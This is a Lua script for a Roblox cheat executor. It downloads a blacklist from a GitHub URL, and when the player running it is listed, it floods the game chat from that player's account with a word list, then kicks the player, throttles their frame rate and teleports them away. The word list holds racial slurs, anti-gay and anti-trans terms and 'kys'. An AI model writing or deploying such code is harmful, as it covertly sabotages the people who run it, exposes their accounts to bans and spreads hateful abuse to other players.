local http_request = syn and syn.request or request;
local Players = game:GetService("Players")
local Teleport = game:GetService("TeleportService")
local BlacklistUsers = http_request({Url = "https://raw.githubusercontent.com/xysimdev/SmokeUsers/main/Blacklist.json", Method = 'GET'}).Body;
local blacklisted = game:GetService("HttpService"):JSONDecode(BlacklistUsers)
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local BadWords = {
    "gay",
    "lesbian",
    "retard",
    "noob",
    "clown",
    "no life",
    "wizard",
    "report",
    "father",
    "mother",
    "dumb",
    "stupid",
    "cringe",
    "parent",
    "kid",
    "ugly",
    "child",
    "trash",
    "bozo",
    "kys",
    "die",
    "killyou",
    "loser",
    "black",
    "white",
    "negro",
    "nivver",
    "negar",
    "bad",
    "worst",
    "fat",
    "hack",
    "exploit",
    "cheat",
    "download",
    "yt",
    "trans",
    "lgbt"
}

for playerName, kickInfo in pairs(blacklisted) do
    local blacklistedplr = Players:FindFirstChild(playerName)
    if blacklistedplr == Players.LocalPlayer then
        if kickInfo.BadWords == true then
            if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
                while true do
                    task.wait()
                    for _, BadWord in ipairs(BadWords) do
                        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(BadWord)
                    end
                    task.wait(kickInfo.KickDelay or 5)
                    Players.LocalPlayer:Kick(kickInfo.Reason)
                    setfpscap(1)
                    Teleport:Teleport(kickInfo.GameTP)
                end
            elseif game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService then
                while true do
                    task.wait()
                    for _, BadWord in ipairs(BadWords) do
                        ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(BadWord, "All")
                    end
                    task.wait(kickInfo.KickDelay or 5)
                    Players.LocalPlayer:Kick(kickInfo.Reason)
                    setfpscap(1)
                    Teleport:Teleport(kickInfo.GameTP)
                end
            end
        end
    end
end
